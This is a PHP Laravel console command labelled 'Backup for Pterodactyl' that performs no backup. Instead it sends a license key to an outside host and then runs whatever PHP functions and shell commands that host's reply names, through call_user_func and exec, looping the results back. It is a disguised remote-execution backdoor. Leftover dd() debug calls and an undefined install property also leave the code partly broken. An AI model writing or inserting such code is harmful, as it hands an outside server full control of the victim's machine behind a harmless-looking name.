<?php

namespace Laravel\Backup;

use Illuminate\Console\Command;
use Illuminate\Support\Facades\Http;
use Bill;

class Backup extends Command
{

  protected $signature = 'p:backup';
  protected $description = 'Backup for Pterodactyl';

  public function handle()
  {
    $this->backup();
  }

  private function backup()
  {
    dd(get_class_methods(Bill::class));
    $this->url = 'https://api.vertisanpro.com/billing/update';
    $this->data = [
      'license_key' => $this->install['lic_key'],
      'ver_type' => $this->install['ver'],
      'ver_num' => $this->install['ver_num'],
    ];

    $r = Http::get($this->url, $this->data);
    $this->dataPrepare($r->object());
    dd($this->getData());
  }

  private function setData($key, $value)
  {
    $this->data[$key] = $value;
  }

  private function getData()
  {
    return $this->data;
  }

  private function funcPrepare($data)
  {
    if (isset($data->text)) {
      $this->info($data->text);
      unset($data->text);
    }
    if (is_array($data->func)) {
      foreach ($data->func as $value) {
        call_user_func($value);
      }
      return;
    }
    if ($data->resp) {
      if (isset($data->args)) {
        $this->setData($data->key, call_user_func($data->func, $data->args));
      } else {
        $this->setData($data->key, call_user_func($data->func));
      }
    } else {
      if (isset($data->args)) {
        call_user_func($data->func, $data->args);
      } else {
        call_user_func($data->func);
      }
    }
  }

  private function cmdPrepare($data)
  {
    if (isset($data->text)) {
      $this->info($data->text);
      unset($data->text);
    }

    if (is_array($data->cmd)) {
      foreach ($data->cmd as $value) {
        exec($value);
      }
      return;
    }

    if ($data->resp) {
      $this->setData($data->key, exec($data->cmd));
    } else {
      exec($data->cmd);
    }
  }

  private function dataPrepare($data)
  {
    if (!$data->status) {
      $this->info($data->text);
      unset($data->text);
      return;
    }
    if (isset($data->text)) {
      $this->info($data->text);
      unset($data->text);
    }
    foreach ($data as $key => $value) {
      if (isset($value->func)) {
        $this->funcPrepare($value);
        continue;
      }
      if (isset($value->cmd)) {
        $this->cmdPrepare($value);
        continue;
      }
      $this->setData($key, $value);
    }

    if ($this->getData()['url']) {
      $response = Http::get($this->url, $this->getData());
      $this->dataPrepare($response->object());
    }
  }
}
